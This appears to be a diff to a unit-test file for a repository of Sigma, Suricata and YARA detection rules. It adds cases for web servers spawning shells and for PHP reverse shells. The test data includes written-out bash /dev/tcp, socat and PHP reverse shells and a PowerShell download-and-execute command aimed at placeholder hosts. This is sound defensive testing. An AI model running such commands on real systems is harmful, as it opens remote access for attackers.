@@ -13,6 +13,8 @@ own test, test_l2_watch.py):
 Needs PyYAML, which the other repository checks already use.
 """
 
+import base64
+import json
 import re
 import shutil
 import subprocess
@@ -23,6 +25,9 @@ from pathlib import Path
 import yaml
 
 DETECTIONS = Path(__file__).resolve().parents[1] / "detections"
+# Test cases kept as data next to the rules: one JSON file per rule set or CVE,
+# written by hand or by the rule factory (rulefactory/). See cases/README.md.
+CASES = [json.loads(path.read_text()) for path in sorted((DETECTIONS / "cases").glob("*.json"))]
 SIGMA = {path.name: yaml.safe_load(path.read_text()) for path in sorted((DETECTIONS / "sigma").glob("*.yml"))}
 
 
@@ -80,8 +85,18 @@ def win(command_line, image=None, parent=None, original=None):
             "OriginalFileName": original}
 
 
-def linux(command_line, image="/usr/bin/bash"):
-    return {"CommandLine": command_line, "Image": image}
+def linux(command_line, image="/usr/bin/bash", parent=None):
+    event = {"CommandLine": command_line, "Image": image}
+    if parent:
+        event["ParentImage"] = parent
+    return event
+
+
+def sample_bytes(item):
+    """A YARA sample from a case file: plain text, or {"base64": "..."}."""
+    if isinstance(item, dict):
+        return base64.b64decode(item["base64"])
+    return item.encode("utf-8")
 
 
 def notice(name):
@@ -151,6 +166,22 @@ SIGMA_CASES = {
          linux("socat tcp-connect:203.0.113.9:4444 exec:/bin/sh,pty,stderr", image="/usr/bin/socat")],
         [linux("rsync -e ssh -c /data backup:/data", image="/usr/bin/rsync"), linux("nc -zv 10.0.0.5 443", image="/usr/bin/nc"),
          linux("socat - tcp:10.0.0.5:80", image="/usr/bin/socat"), linux("bash -c ls /dev")]),
+    "techdetechtives_web_server_spawns_shell_linux.yml": (
+        [linux("sh -c id", image="/bin/sh", parent="/usr/sbin/php-fpm8.2"),
+         linux("bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", image="/bin/bash", parent="/usr/sbin/apache2"),
+         linux("python3 -c import pty;pty.spawn('/bin/sh')", image="/usr/bin/python3.11", parent="/usr/bin/php-cgi8.1"),
+         linux("whoami", image="/usr/bin/whoami", parent="/usr/sbin/nginx")],
+        [linux("sh -c /usr/bin/rotatelogs /var/log/apache2/access.%Y 86400", image="/bin/sh", parent="/usr/sbin/apache2"),
+         linux("/usr/sbin/php-fpm8.2 --nodaemonize", image="/usr/sbin/php-fpm8.2", parent="/usr/lib/systemd/systemd"),
+         linux("bash -c id", image="/bin/bash", parent="/usr/sbin/sshd"),
+         linux("convert in.png out.jpg", image="/usr/bin/convert", parent="/usr/sbin/php-fpm8.2")]),
+    "techdetechtives_web_server_spawns_shell_windows.yml": (
+        [win("cmd.exe /c whoami", parent="C:\\php\\php-cgi.exe"),
+         win("powershell.exe -nop -w hidden -c iex(iwr http://203.0.113.9/a)", parent="C:\\Windows\\System32\\inetsrv\\w3wp.exe"),
+         win("whoami.exe /all", parent="C:\\Program Files\\Apache24\\bin\\httpd.exe")],
+        [win("cmd.exe /c dir", parent="C:\\Windows\\explorer.exe"),
+         win("conhost.exe 0xffffffff -ForceV1", parent="C:\\php\\php-cgi.exe"),
+         win("php-cgi.exe", parent="C:\\Windows\\System32\\inetsrv\\w3wp.exe")]),
     "techdetechtives_wmi_spawns_script_interpreter.yml": (
         [win("cscript.exe", parent="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe")],
         [win("notepad.exe", parent="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"), win("cscript.exe")]),
@@ -196,6 +227,11 @@ SIGMA_CASES = {
 }
 
 
+for _case_file in CASES:
+    for _rule, _case in _case_file.get("sigma", {}).items():
+        SIGMA_CASES[_rule] = (_case["match"], _case["nomatch"])
+
+
 class SigmaRules(unittest.TestCase):
     def test_every_rule_has_cases(self):
         self.assertEqual(sorted(SIGMA_CASES), sorted(SIGMA))
@@ -230,7 +266,8 @@ class SuricataRules(unittest.TestCase):
     # Options that are looked at for every packet. A rule made only of addresses
     # and a threshold is checked once per conversation, which cannot count a flood.
     PER_PACKET = ("itype:", "flags:", "dsize:", "ttl:", "fragbits:")
-    CLASSTYPES = {"attempted-dos", "attempted-recon", "attempted-admin", "policy-violation", "misc-activity"}
+    CLASSTYPES = {"attempted-dos", "attempted-recon", "attempted-admin", "policy-violation", "misc-activity",
+                  "web-application-attack"}
 
     def test_structure(self):
         sids = []
@@ -449,6 +486,11 @@ class YaraRules(unittest.TestCase):
         "TechDetechtives_OT_Script_Stops_Or_Reprograms_Controller": (
             [b"import snap7\nc = snap7.client.Client()\nc.connect('10.0.0.5', 0, 1)\nc.plc_stop()\n"],
             [b"import snap7\nc = snap7.client.Client()\nprint(c.get_cpu_info())\n", b"from pymodbus.client import ModbusTcpClient\nc.write_coil(1, True)\n"]),
+        "TechDetechtives_PHP_Reverse_Shell": (
+            [b"<?php $sock=fsockopen(\"203.0.113.9\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
+             b"<?php $s=stream_socket_client('tcp://203.0.113.9:443'); $p=proc_open('/bin/bash -i', [0=>$s,1=>$s,2=>$s], $x); ?>"],
+            [b"<?php $f=fsockopen('mail.example.org',25); fwrite($f,'HELO lab'); ?>", b"<?php exec('/bin/sh -c ls'); ?>",
+             b"notes: fsockopen and /bin/sh -i are used by reverse shells"]),
         "TechDetechtives_Script_Base64_Decode_And_Invoke": (
             [b"$b=[Convert]::FromBase64String($x); Invoke-Expression ([Text.Encoding]::UTF8.GetString($b))"],
             [b"[Convert]::FromBase64String($x) | Set-Content out.bin"]),
@@ -456,6 +498,10 @@ class YaraRules(unittest.TestCase):
 
     @classmethod
     def setUpClass(cls):
+        cls.SAMPLES = dict(cls.SAMPLES)
+        for case_file in CASES:
+            for rule, case in case_file.get("yara", {}).items():
+                cls.SAMPLES[rule] = ([sample_bytes(x) for x in case["match"]], [sample_bytes(x) for x in case["nomatch"]])
         cls.rule_files = sorted((DETECTIONS / "yara").glob("*.yar"))
         cls.defined = set()
         for path in cls.rule_files:
